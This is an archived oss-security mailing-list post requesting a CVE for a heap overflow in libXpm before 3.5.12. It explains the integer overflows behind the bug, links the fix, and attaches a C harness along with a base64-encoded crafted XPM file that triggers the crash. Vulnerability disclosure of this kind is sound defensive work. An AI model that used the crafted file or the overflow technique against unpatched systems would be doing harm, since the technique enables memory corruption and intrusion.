X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4097" "Sunday" "22" "January" "2017" "14:22:51" "+0100" "Tobias Stoeckmann" "tobias@stoeckmann.org" "<20170122132251.GA11536@pepper.home.stoeckmann.org>" "112" "[oss-security] CVE Request: libXpm < 3.5.12 heap overflow" nil nil nil "1" "2017012213:22:51" "[oss-security] CVE Request: libXpm < 3.5.12 heap overflow" (number mark "U       tobias@stoec Jan 22  112/4097  " thread-indent "\"[oss-security] CVE Request: libXpm < 3.5.12 heap overflow\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 32640 invoked by uid 550); 22 Jan 2017 14:17:07 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9375 invoked from network); 22 Jan 2017 13:23:07 -0000
Date: Sun, 22 Jan 2017 14:22:51 +0100
From: Tobias Stoeckmann <tobias@stoeckmann.org>
To: oss-security@lists.openwall.com
Message-ID: <20170122132251.GA11536@pepper.home.stoeckmann.org>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="qvbW/XusmWuEbpm3"
Content-Disposition: inline
X-Provags-ID: V03:K0:Q4S+Dp+0ezmE70n6XeoxSJzhtPM3eB8hoWlqpSN5pTw7Kr5CZYa
 exg5fZn1lW5QrwpFYIjmZB7/9h8l9rvAFnegBUJxEbAUXG2M0P0+H+k1B0UH8pvHqbjRMaF
 Do5v9qCkZSqDnFJ+U+YT+A6CT5h5r0zl35aA6EzoHpDO5Ewhq6YMViCjbkCv4ebrwYknyZP
 /0nA8CcfGQTvBh0ZV/Rmw==
X-UI-Out-Filterresults: notjunk:1;V01:K0:AJrC90oXJaY=:zCApi3nqW1qCtPu54/QDnH
 Wbq0z6RgJZadDhl6mqpnKV+dhF9ZVSjAdzZXlTYQdAvF/AXcd/DaM1vIRx9D5x/9ob5yrmJCj
 NL/LDZJ4YeXFP/FVt95SH/hMnpf3zPfYdxOl1F563sEw+AaRmoXLMwDSdsPPDYkW5jPnnRPkU
 WPmXq2ZvZR/Web2DRwohFBMLrLlvcN7Dbai8PWn3I3sowoKQ+/insSNoTmCpS48vIRIDC2F2L
 1gFVZDHD4hXcHKCDueamvKkHtwiLyVzdpERZLn3zSGibH/nZy4QbLy+duAo8VR+oyGFCNZbcL
 w44gqbqWl7pr2yp3j6pEb6vaZFPLdcBkNLZuLWLAVbHcTXH/62k0V5vikhryba5OyO0WxGlbV
 0auEHStjuvrggA2eLX4PHBdTyrfWQ4xm+BXuFnVkq2UkVgCHBoZSRqgXb55pOg+A7XeE4e6FP
 2nb2AgeY2+BoGK1ik0iVTaMvrf3fpqxhUIVNVMbwmZKASQ7vD/stUhALXlZ/ZQV8/p/PKD4U/
 LWy5i8t9Wj5MHVH5Qh9MTl6Ep92jPtBQNDYE5BMIeII95VX/b63z1pirzhvOA7pdqxcwpEqH8
 45+hoH4hgBwAKoaZaHRBmh5z33PtWv+b+3gab0kQSIc5GK/nSjSEMMzwXrnM5EjlKx+mFzy9s
 C/hVMDL1Zn3j56ZaTCw9xIJCwPJ56LAKoGJvHWLp7OszVb8uzQmBrk3S8IC61nA2F+lg=
Subject: [oss-security] CVE Request: libXpm < 3.5.12 heap overflow

--qvbW/XusmWuEbpm3
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

SUMMARY
=======
An out of boundary write has been found in libXpm < 3.5.12 which can be
exploited by an attacker through maliciously crafted XPM files.

PREREQUISITE
============
For this vulnerability to step in, a program must explicitly request
to also parse XPM extensions while reading files. The motif toolkit and
xdm are two among some programs that set the flag (XpmReturnExtensions).
It can only be exploited on 64 bit systems.

DETAILS
=======
The affected code is prone to two 32 bit integer overflows while parsing
extensions: the amount of extensions and their concatenated length. The
fact that two such overflows exist makes it possible to have full
control of the memory management. The attacker can choose:

- how much heap space is allocated
- how many bytes will overflow
- the content of the bytes that overflow

Due to the integrated gzip compression in XPM files, the file can be
as small as 4 MB to trigger this issue, and doesn't need to be larger
than 8 MB for a fully arbitrary attack.

PROOF OF CONCEPT
================
I have attached two files: poc.c is a vulnerable program that uses
libXpm to parse an XPM file, including its extensions. The second file
is a maliciously crafted XPM file, which is gzip-compressed thrice to
reduce its size to be friendlier for e-mail transmissions. You have to
gunzip it twice, which increases its size back to 4 MB. If used with a
vulnerable version, the program will trigger a segmentation fault.

SOLUTION
========
It is recommend to update to the released libXpm version 3.5.12.

The commit that fixes the issue can be found here:
https://cgit.freedesktop.org/xorg/lib/libXpm/commit/?id=d1167418f0fd02a27f617ec5afd6db053afbe185

--qvbW/XusmWuEbpm3
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="poc.c"

#include <X11/Xlib.h>
#include <X11/xpm.h>

#include <err.h>
#include <string.h>

int
main(int argc, char *argv[0])
{
	Display *d;
	char *fname = argc > 1 ? argv[1] : "poc.xpm";
	char **data;
	XpmImage img;
	XpmInfo info;

	if ((d = XOpenDisplay(NULL)) == NULL)
		err(1, "failed to open display");

	memset(&info, 0, sizeof(info));
	info.valuemask |= XpmReturnExtensions;
	if (XpmReadFileToXpmImage(fname, &img, &info) != XpmSuccess)
		err(1, "failed to parse image");

	if (XpmCreateDataFromXpmImage(&data, &img, &info) != XpmSuccess)
		err(1, "failed to create data");

	return 0;
}


--qvbW/XusmWuEbpm3
Content-Type: application/x-gunzip
Content-Disposition: attachment; filename="poc.xpm.gz.gz.gz"
Content-Transfer-Encoding: base64

H4sICG7qOlgAA3Jlc3VsdC54cG0uZ3p+Lmd6fgDtku1PU1ccx1saxK0Mlz1U
Mug6kzm3xBYNkbqyWaNLJD7AC6OOVLkxDlksVAuUksl6mriFTYK4hcCmYmec
EnGskyml6aQkndStakmg6Spt2rXYCit9EEof7z1z6b1t/4O9OeflN/km38/v
fDhdq1dLFgQf0xjN9S2yxlZe+6kmXsNnCtqi3cn8KKwyh08WDPS8emd3ldE2
Xc3bq7Czh3+82lvB531ZdfFwoSz14kNLKf/Evuu9JSc2rDcMlZu6D146/ufu
sxbW+13Md7TF1971eku9S2UdvG0zHmlkviWSYtTdBbENO2IaGNLg4+61+A1h
YhD6ObBcHzevAe6CIAhPW2JnsPgeRWCXDy7vIhJlhBg+4+OPOFCrEgMrlrjl
TK4FT/W34RJIDUcawPIhPgjxYR+I8MFsDXFfH7sJF3wK2wwX+H0gqk6YIa4n
rqri3cJk9CT0m3EtSNUAozB+SxX/GtPjcz3QxkkOC1fEYCjJ14eChMtJFIAg
BpNYrFIfKKCl3wTEiGhNf3348+V/WseJI2TsgnLz9SLp66HvdZvlhWR4/idB
UZM977fR9XPn6GT27aKzZ7897/CoIdCnW0WGVW1lJrcu/6l1vuMhm0GGb5+u
kH3VSd/Wwvdm2weMV7pFSuvoF/bNZLR9BE9Kz4qUpra/HM1WMqT9Eaiv7dDQ
cMGAWnuMzJSfPJ8Y3jTREJjMaS9svS1lhh73na/MrBkFwmop85StSCcKvEGG
b9nubuwKsn7ABpe2ZAH9tpl1b66KPXB8l20fZHdWSOh1s680GzNrVoLG9yR0
3uxRuelIhk/3/IqOvP/OmAP44UXB7waaSlvSkm0PeaYmuRNi0Y5AcWYNgW+9
x52or/RLtOIMX3Rk47hIqRh4ZM0BbNjf2V7sKpcfy7ZrZaWPx/Lbm/bcz157
Vs8ZHMsfa+x0cOUvZfjq+u7JmVPq6fiFLOBK48LLaxgdXsmDbPvmuZ0lGpq6
6YWcayejntc0tP7FX3RPfs7wOUwjMQk9IRNgOYCX97HdR5Vme3dO2yL91MNy
3eGuy167ESouuVmuEXabxr4lw3e6luXkbtdX+8Q55/n1xs4PCpGMSEZqDZKR
4kMyUoBIxnQbyUiuQTJSfEhGChDJmG4jGck1SEaKD8lIASIZyTaSMb0GyUjx
IRkpQCQj2UYyptcgGTN8SEYSEMlItpGM6TVIxgwfkpEERDKSbSQjuQbJSPEh
GanPQjKm20hGcg2SkeJDMlLnQTKm20hGcg2SkeJDMlKA/5+McCU2j4XPcBJX
OHboUccN+il4GRAliiepfmgog99gCQaBPTMIw0kwByzCyCFFUpVigL99cNLM
IaYgjgs3tfZWHb8gpP0Lya6R5u0pAAA=

--qvbW/XusmWuEbpm3--
